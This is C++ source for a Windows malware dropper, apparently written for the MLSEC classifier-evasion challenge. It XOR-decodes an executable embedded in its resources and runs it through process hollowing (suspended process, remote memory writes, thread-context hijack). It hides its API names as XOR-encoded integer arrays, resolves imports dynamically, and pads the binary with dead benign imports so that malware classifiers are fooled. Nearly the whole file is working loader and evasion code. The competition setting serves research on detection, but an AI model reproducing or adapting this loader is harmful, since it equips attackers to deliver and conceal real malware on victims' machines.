// Drops and executes an Executable Binary from the PE Resources
// Created By Marcus Botacin for the MLSEC challenge
// Changelog: Created in 2019, updated in 2020 with obfuscation tricks

// Required Imports
#pragma warning(disable:4996)
#define UNICODE
#include<stdio.h>		// Debug Prints
#include<Windows.h>		// Resource Management
#include"resource.h"	// Resources Definition
#include<time.h>		// rand seed

// Imports for the dead code function
#include<commctrl.h>
#include<shlobj.h>>t.h>
#include<Uxtheme.h>
#include<atlstr.h>
#include<atlenc.h>

// Linking with teh dead imports
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Winmm.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "uxtheme.lib")

// Functions prototypes
void dead();
void drop(int size, void* buffer);
void* XOR(void* data, int size);
void* base64decode(void* data, DWORD* size);
void launch();
void set_name();

// Dropper Configurations
#define DEAD_CODE
#define XOR_ENCODE
#define XOR_KEY 0x73
//#define BASE64
#define RANDOM_NAME
#define NAME_SIZE 10
//#define INJECT

// global: final binary name
char name[10 * NAME_SIZE];

// definitions for the dynamic imports
// hiding the imports is important to increase the classifier confidence
typedef BOOL(WINAPI* MyReadProcessMemory)(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    LPVOID  lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesRead
    );
typedef BOOL(WINAPI* MyWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );
typedef BOOL(WINAPI* MyGetThreadContext)(HANDLE    hThread, LPCONTEXT lpContext);
typedef BOOL(WINAPI* MySetThreadContext)(HANDLE        hThread, const CONTEXT* lpContext);
typedef LPVOID(WINAPI* MyVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef DWORD(WINAPI* MyGetModuleFileNameW)(HMODULE hModule, WCHAR* lpFilename, DWORD   nSize);
typedef HRSRC(WINAPI* MyFindResourceW)(HMODULE hModule, LPCWSTR  lpName, LPCWSTR  lpType);
typedef HGLOBAL(WINAPI* MyLoadResource)(HMODULE hModule, HRSRC   hResInfo);
typedef LPVOID(WINAPI* MyLockResource)(HGLOBAL hResData);
typedef DWORD(WINAPI* MySizeofResource)(HMODULE hModule, HRSRC   hResInfo);
typedef void* (WINAPI* Mymalloc)(size_t size);
typedef void    (WINAPI* Mysrand)(unsigned int seed);
typedef __time64_t(WINAPI* My_time64)(__time64_t* destTime);
typedef int     (WINAPI* Myrand)(void);
typedef FILE* (WINAPI* Myfopen)(const char* filename, const char* mode);
typedef int     (WINAPI* Myfprintf)(FILE* stream, const char* format, ...);
typedef int     (WINAPI* Myfclose)(FILE* stream);
typedef void    (WINAPI* Myfree)(void* memblock);
typedef BOOL(WINAPI* MyCreateProcessW)(
    LPCTSTR lpApplicationName, // 应用程序名称  
    LPTSTR lpCommandLine, // 命令行字符串  
    LPSECURITY_ATTRIBUTES lpProcessAttributes, // 进程的安全属性  
    LPSECURITY_ATTRIBUTES lpThreadAttributes, // 线程的安全属性  
    BOOL bInheritHandles, // 是否继承父进程的属性  
    DWORD dwCreationFlags, // 创建标志  
    LPVOID lpEnvironment, // 指向新的环境块的指针  
    LPCTSTR lpCurrentDirectory, // 指向当前目录名的指针  
    LPSTARTUPINFO lpStartupInfo, // 传递给新进程的信息  
    LPPROCESS_INFORMATION lpProcessInformation // 新进程返回的信息 
    );
typedef DWORD(WINAPI* MyResumeThread)(HANDLE hThread);
typedef LPVOID(WINAPI* MyVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );
typedef BOOL(WINAPI* MyTerminateProcess)(
    HANDLE hProcess, // handle to the process，进程句柄
    UINT uExitCode   // exit code for the process，传递给进程的退出码
    );

// handles for the dynamic resolutions
HMODULE k32;
HMODULE msc;
MyVirtualAllocEx vaex;
MyResumeThread rt;
MyFindResourceW frw;
MyLoadResource mlr;
MyLockResource mlor;
MySizeofResource sor;
Mymalloc mm;
MyGetThreadContext gtc;
MySetThreadContext stc;
Mysrand srd;
My_time64 tm;
MyVirtualAlloc va;
Myrand rd;
Myfopen fop;
MyReadProcessMemory rpm;
MyWriteProcessMemory wpm;
Myfprintf fpf;
Myfclose fcl;
Myfree fr;
MyCreateProcessW cp;
MyGetModuleFileNameW gmfn;
MyTerminateProcess tp;

// decode strings
char dec[1024];
char* decode(int* encoded, int size)
{
    // I put it in a for so one can modify the encoding to something more complex
    for (int i = 0; i < size; i++)
    {
        dec[i] = char(encoded[i] ^ 0xff);
    }
    return dec;
}

// Strings encoded as int arrays
int k32enc[] = { 180, 154, 141, 145, 154, 147, 204, 205, 209, 155, 147, 147, 255 };
int mscenc[] = { 178, 172, 169, 188, 173, 206, 206, 207, 209, 187, 179, 179, 255 };
int findrsrcenc[] = { 185, 150, 145, 155, 173, 154, 140, 144, 138, 141, 156, 154, 168, 255 };
int loadrsrcenc[] = { 179, 144, 158, 155, 173, 154, 140, 144, 138, 141, 156, 154, 255 };
int lockrsrcenc[] = { 179, 144, 156, 148, 173, 154, 140, 144, 138, 141, 156, 154, 255 };
int szrsrcenc[] = { 172, 150, 133, 154, 144, 153, 173, 154, 140, 144, 138, 141, 156, 154, 255 };
int cprocenc[] = { 188, 141, 154, 158, 139, 154, 175, 141, 144, 156, 154, 140, 140, 168, 255 };
int mallocenc[] = { 146, 158, 147, 147, 144, 156, 255 };
int srandenc[] = { 140, 141, 158, 145, 155, 255 };
int timeenc[] = { 160, 139, 150, 146, 154, 201, 203, 255 };
int randenc[] = { 141, 158, 145, 155, 255 };
int fopenc[] = { 153, 144, 143, 154, 145, 255 };
int fprintfenc[] = { 153, 143, 141, 150, 145, 139, 153, 255 };
int fclosenc[] = { 153, 156, 147, 144, 140, 154, 255 };
int freenc[] = { 153, 141, 154, 154, 255 };
int resthreadenc[] = { 173, 154, 140, 138, 146, 154, 171, 151, 141, 154, 158, 155, 255 };
int getmodfilenameaenc[] = { 184, 154, 139, 178, 144, 155, 138, 147, 154, 185, 150, 147, 154, 177, 158, 146, 154, 168, 255 };
int getthreadcontenc[] = { 184, 154, 139, 171, 151, 141, 154, 158, 155, 188, 144, 145, 139, 154, 135, 139, 255 };
int setthreadcontenc[] = { 172, 154, 139, 171, 151, 141, 154, 158, 155, 188, 144, 145, 139, 154, 135, 139, 255 };
int readprocmemenc[] = { 173, 154, 158, 155, 175, 141, 144, 156, 154, 140, 140, 178, 154, 146, 144, 141, 134, 255 };
int writeprocmemenc[] = { 168, 141, 150, 139, 154, 175, 141, 144, 156, 154, 140, 140, 178, 154, 146, 144, 141, 134, 255 };
int virtallocenc[] = { 169, 150, 141, 139, 138, 158, 147, 190, 147, 147, 144, 156, 255 };
int virtallocexenc[] = { 169, 150, 141, 139, 138, 158, 147, 190, 147, 147, 144, 156, 186, 135, 255 };
int tpsrcenc[] = { 171, 154, 141, 146, 150, 145, 158, 139, 154, 175, 141, 144, 156, 154, 140, 140, 255 };

void init() {
    // I left the load and get proc as explicit apis bc it was obfuscated enough
          // if you want to hide them, parse the k32 manually
    k32 = LoadLibraryA(decode(k32enc, 13));
    // resolve dynamic refs when starting
    rt = (MyResumeThread)GetProcAddress(k32, decode(resthreadenc, 13));
    gmfn = (MyGetModuleFileNameW)GetProcAddress(k32, decode(getmodfilenameaenc, 19));
    gtc = (MyGetThreadContext)GetProcAddress(k32, decode(getthreadcontenc, 17));
    stc = (MySetThreadContext)GetProcAddress(k32, decode(setthreadcontenc, 17));
    rpm = (MyReadProcessMemory)GetProcAddress(k32, decode(readprocmemenc, 18));
    wpm = (MyWriteProcessMemory)GetProcAddress(k32, decode(writeprocmemenc, 19));
    va = (MyVirtualAlloc)GetProcAddress(k32, decode(virtallocenc, 13));
    vaex = (MyVirtualAllocEx)GetProcAddress(k32, decode(virtallocexenc, 15));
    frw = (MyFindResourceW)GetProcAddress(k32, decode(findrsrcenc, 14));
    mlr = (MyLoadResource)GetProcAddress(k32, decode(loadrsrcenc, 13));
    mlor = (MyLockResource)GetProcAddress(k32, decode(lockrsrcenc, 13));
    sor = (MySizeofResource)GetProcAddress(k32, decode(szrsrcenc, 15));
    //MessageBoxA(NULL, decode(cprocenc, 14), "Hello\n", 0);
    cp = (MyCreateProcessW)GetProcAddress(k32, decode(cprocenc, 15));
    tp = (MyTerminateProcess)GetProcAddress(k32, decode(tpsrcenc, 17));
    msc = LoadLibraryA(decode(mscenc, 13));
    mm = (Mymalloc)GetProcAddress(msc, decode(mallocenc, 7));
    srd = (Mysrand)GetProcAddress(msc, decode(srandenc, 6));
    tm = (My_time64)GetProcAddress(msc, decode(timeenc, 8));
    rd = (Myrand)GetProcAddress(msc, decode(randenc, 5));
    fop = (Myfopen)GetProcAddress(msc, decode(fopenc, 6));
    fpf = (Myfprintf)GetProcAddress(msc, decode(fprintfenc, 8));
    fcl = (Myfclose)GetProcAddress(msc, decode(fclosenc, 7));
    fr = (Myfree)GetProcAddress(msc, decode(freenc, 5));
}

/*
    Based on examples from:
    * https://github.com/Zer0Mem0ry/RunPE
    * https://github.com/TRIKbranch/RunPE-X86--X64-
    * https://gist.github.com/andreafortuna/d7fb92fb29e4ade27c0c6ce4401c99fa
    This example compiles and runs standalone, just as a proof of concept.
*/
int runPE64(
    LPPROCESS_INFORMATION lpPI,
    LPSTARTUPINFO lpSI,
    LPVOID lpImage,
    LPWSTR wszArgs,
    SIZE_T szArgs
)
{
    WCHAR wszFilePath[MAX_PATH];
    if (!gmfn(
        NULL,
        wszFilePath,
        sizeof wszFilePath
    ))
    {
        return -1;
    }
    WCHAR wszArgsBuffer[MAX_PATH + 2048];
    ZeroMemory(wszArgsBuffer, sizeof wszArgsBuffer);
    SIZE_T length = wcslen(wszFilePath);
    memcpy(
        wszArgsBuffer,
        wszFilePath,
        length * sizeof(WCHAR)
    );
    wszArgsBuffer[length] = ' ';
    memcpy(
        wszArgsBuffer + length + 1,
        wszArgs,
        szArgs
    );

    PIMAGE_DOS_HEADER lpDOSHeader =
        reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
    PIMAGE_NT_HEADERS lpNTHeader =
        reinterpret_cast<PIMAGE_NT_HEADERS>(
            reinterpret_cast<DWORD64>(lpImage) + lpDOSHeader->e_lfanew
            );
    if (!cp(
        NULL,
        wszArgsBuffer,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        lpSI,
        lpPI
    ))
    {
        return -3;
    }

    CONTEXT stCtx;
    ZeroMemory(&stCtx, sizeof stCtx);
    stCtx.ContextFlags = CONTEXT_FULL;
    if (!gtc(lpPI->hThread, &stCtx))
    {
        tp(
            lpPI->hProcess,
            -4
        );
        return -4;
    }

    LPVOID lpImageBase = vaex(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(lpNTHeader->OptionalHeader.ImageBase),
        lpNTHeader->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (lpImageBase == NULL)
    {
        tp(
            lpPI->hProcess,
            -5
        );
        return -5;
    }

    if (!wpm(
        lpPI->hProcess,
        lpImageBase,
        lpImage,
        lpNTHeader->OptionalHeader.SizeOfHeaders,
        NULL
    ))
    {
        tp(
            lpPI->hProcess,
            -6
        );
        return -6;
    }

    for (
        SIZE_T iSection = 0;
        iSection < lpNTHeader->FileHeader.NumberOfSections;
        ++iSection
        )
    {
        PIMAGE_SECTION_HEADER stSectionHeader =
            reinterpret_cast<PIMAGE_SECTION_HEADER>(
                reinterpret_cast<DWORD64>(lpImage) +
                lpDOSHeader->e_lfanew +
                sizeof(IMAGE_NT_HEADERS64) +
                sizeof(IMAGE_SECTION_HEADER) * iSection
                );

        if (!wpm(
            lpPI->hProcess,
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImageBase) +
                stSectionHeader->VirtualAddress
                ),
            reinterpret_cast<LPVOID>(
                reinterpret_cast<DWORD64>(lpImage) +
                stSectionHeader->PointerToRawData
                ),
            stSectionHeader->SizeOfRawData,
            NULL
        ))
        {
            tp(
                lpPI->hProcess,
                -7
            );
            return -7;
        }
    }

    if (!wpm(
        lpPI->hProcess,
        reinterpret_cast<LPVOID>(
            stCtx.Rdx + sizeof(LPVOID) * 2
            ),
        &lpImageBase,
        sizeof(LPVOID),
        NULL
    ))
    {
        tp(
            lpPI->hProcess,
            -8
        );
        return -8;
    }

    stCtx.Rcx = reinterpret_cast<DWORD64>(lpImageBase) +
        lpNTHeader->OptionalHeader.AddressOfEntryPoint;
    if (!stc(
        lpPI->hThread,
        &stCtx
    ))
    {
        tp(
            lpPI->hProcess,
            -9
        );                                                                                     
        return -9;
    }

    if (!rt(lpPI->hThread))
    {
        tp(
            lpPI->hProcess,
            -10
        );
        return -10;
    }

    return 0;
}

// Entry Point
int main()
{
    init();
    // Handle to myself
    HMODULE h = GetModuleHandle(NULL);
    // Locate Resource
    HRSRC r = frw(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
    // Load Resource
    HGLOBAL rc = mlr(h, r);
    // Ensure nobody else will handle it
    void* data = mlor(rc);
    // Get embedded file size
    DWORD size = sor(h, r);
    // Obfuscation Procedures start here
#ifdef XOR_ENCODE
    data = XOR(data, size);
#endif
#ifdef BASE64
    data = base64decode(data, &size);
#endif
    DWORD dwRet = 0;

    PROCESS_INFORMATION stPI;
    ZeroMemory(&stPI, sizeof stPI);
    STARTUPINFO stSI;
    ZeroMemory(&stSI, sizeof stSI);
    WCHAR szArgs[] = L"";
    if (!runPE64(
        &stPI,
        &stSI,
        reinterpret_cast<LPVOID>(data),
        szArgs,
        sizeof szArgs
    ))
    {
        WaitForSingleObject(
            stPI.hProcess,
            INFINITE
        );

        GetExitCodeProcess(
            stPI.hProcess,
            &dwRet
        );

        CloseHandle(stPI.hThread);
        CloseHandle(stPI.hProcess);
    }
#ifdef DEAD_CODE
    // dead code
    dead();
#endif
    // exit without waiting child process
    return 0;
}

// Decode a Base64 String
void* base64decode(void* data, DWORD* size)
{
    // original string size
    int original_size = strlen((char*)data);
    // number of bytes after decoded
    int decoded_size = Base64DecodeGetRequiredLength(original_size);
    // temporary buffer to store the decoded bytes
    void* buffer2 = malloc(decoded_size);
    // decoded
    Base64Decode((PCSTR)data, original_size, (BYTE*)buffer2, &decoded_size);
    // return new buffer size
    *size = decoded_size;
    // return new buffer
    return buffer2;
    // old buffer is lost (without freeing, sorry)
}

// XOR bytes in the buffer with a key
void* XOR(void* data, int size) {
    // auxiliary buffer
    // this is never freed, but ok, i'm not a goodware anyway
    void* buffer = malloc(size);
    for (int i = 0; i < size; i++)
    {
        ((char*)buffer)[i] = ((char*)data)[i] ^ XOR_KEY;
    }
    return buffer;
}

// Dead Imports Function
void dead()
{
    return;
    memcpy(NULL, NULL, NULL);
    memset(NULL, NULL, NULL);
    strcpy(NULL, NULL);
    ShellAboutW(NULL, NULL, NULL, NULL);
    SHGetSpecialFolderPathW(NULL, NULL, NULL, NULL);
    ShellMessageBox(NULL, NULL, NULL, NULL, NULL);
    RegEnumKeyExW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    RegOpenKeyExW(NULL, NULL, NULL, NULL, NULL);
    RegEnumValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    RegGetValueW(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    RegDeleteKeyW(NULL, NULL);
    RegQueryInfoKeyW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    RegQueryValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
    RegSetValueExW(NULL, NULL, NULL, NULL, NULL, NULL);
    RegCloseKey(NULL);
    RegCreateKey(NULL, NULL, NULL);
    BSTR_UserFree(NULL, NULL);
    BufferedPaintClear(NULL, NULL);
    CoInitialize(NULL);
    CoUninitialize();
    CLSID x;
    CoCreateInstance(x, NULL, NULL, x, NULL);
    IsThemeActive();
    ImageList_Add(NULL, NULL, NULL);
    ImageList_Create(NULL, NULL, NULL, NULL, NULL);
    ImageList_Destroy(NULL);
    WideCharToMultiByte(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    lstrlenA(NULL);
    GetStartupInfoW(NULL);
    DeleteCriticalSection(NULL);
    LeaveCriticalSection(NULL);
    EnterCriticalSection(NULL);
    GetSystemTime(NULL);
    CreateEventW(NULL, NULL, NULL, NULL);
    CreateThread(NULL, NULL, NULL, NULL, NULL, NULL);
    ResetEvent(NULL);
    SetEvent(NULL);
    CloseHandle(NULL);
    GlobalSize(NULL);
    GlobalLock(NULL);
    GlobalUnlock(NULL);
    GlobalAlloc(NULL, NULL);
    lstrcmpW(NULL, NULL);
    MulDiv(NULL, NULL, NULL);
    GlobalFindAtomW(NULL);
    GetLastError();
    lstrlenW(NULL);
    CompareStringW(NULL, NULL, NULL, NULL, NULL, NULL);
    HeapDestroy(NULL);
    HeapReAlloc(NULL, NULL, NULL, NULL);
    HeapSize(NULL, NULL, NULL);
    SetBkColor(NULL, NULL);
    SetBkMode(NULL, NULL);
    EmptyClipboard();
    CreateDIBSection(NULL, NULL, NULL, NULL, NULL, NULL);
    GetStockObject(NULL);
    CreatePatternBrush(NULL);
    DeleteDC(NULL);
    EqualRgn(NULL, NULL);
    CombineRgn(NULL, NULL, NULL, NULL);
    SetRectRgn(NULL, NULL, NULL, NULL, NULL);
    CreateRectRgnIndirect(NULL);
    GetRgnBox(NULL, NULL);
    CreateRectRgn(NULL, NULL, NULL, NULL);
    CreateCompatibleBitmap(NULL, NULL, NULL);
    LineTo(NULL, NULL, NULL);
    MoveToEx(NULL, NULL, NULL, NULL);
    ExtCreatePen(NULL, NULL, NULL, NULL, NULL);
    GetObjectW(NULL, NULL, NULL);
    GetTextExtentPoint32W(NULL, NULL, NULL, NULL);
    GetTextMetricsW(NULL, NULL);
    CreateSolidBrush(NULL);
    SetTextColor(NULL, NULL);
    GetDeviceCaps(NULL, NULL);
    CreateCompatibleDC(NULL);
    CreateFontIndirectW(NULL);
    SelectObject(NULL, NULL);
    GetTextExtentPointW(NULL, NULL, NULL, NULL);
    RpcStringFreeW(NULL);
    UuidToStringW(NULL, NULL);
    UuidCreate(NULL);
    timeGetTime();
    SetBkColor(NULL, NULL);
    free(NULL);
    isspace(NULL);
    tolower(NULL);
    abort();
    isalnum(NULL);
    isdigit(NULL);
    isxdigit(NULL);
    toupper(NULL);
    malloc(NULL);
    free(NULL);
    memmove(NULL, NULL, NULL);
    isalpha(NULL);
}